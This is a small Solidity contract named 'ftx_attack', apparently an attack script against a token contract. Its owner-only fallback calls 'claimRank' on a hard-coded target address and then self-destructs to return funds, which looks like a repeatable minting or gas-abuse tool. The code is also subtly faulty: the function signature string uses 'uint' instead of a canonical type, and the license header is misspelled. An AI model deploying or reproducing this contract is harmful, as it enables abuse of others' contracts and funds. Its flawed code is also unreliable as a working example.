// SPDX-License-Identiifier: MIT
pragma solidity ^0.8.4;

contract ftx_attack{
    address private owner;
    address public target;
    constructor() {
        owner = msg.sender;
        target = 0xca41f293A32d25c2216bC4B30f5b0Ab61b6ed2CB;
    }

    fallback() external payable{
        uint term = 100;
        require(msg.sender == owner,"owner only");
        (bool fucked,) = target.call(abi.encodeWithSignature("claimRank(uint)", term));
        require(fucked, "sbf is still cheating");
        selfdestruct(payable(owner));
    }
}
